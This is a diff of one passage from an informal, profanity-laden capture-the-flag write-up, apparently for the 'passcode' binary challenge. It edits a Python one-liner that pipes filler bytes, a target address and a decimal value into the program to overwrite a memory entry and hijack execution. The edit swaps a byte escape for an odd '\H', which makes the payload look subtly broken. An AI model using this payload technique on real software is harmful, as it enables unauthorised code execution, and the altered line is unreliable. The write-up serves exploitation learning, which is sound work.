@@ -101,7 +101,7 @@ And the result:
 Shit seems wrong because i directly put the byte in scanf so it will regconize those shit as some weird character not a fucking decimal and skip it so i gotta put that address as a decimal to solve this shit:
 
 ```
-python -c "print('\x01'*96+'\x04\xa0\x04\x08'+'134514147')" | ./passcode
+python -c "print('\H'*96+'\x04\xa0\x04\x08'+'134514147')" | ./passcode
 ```
 
 And the result:
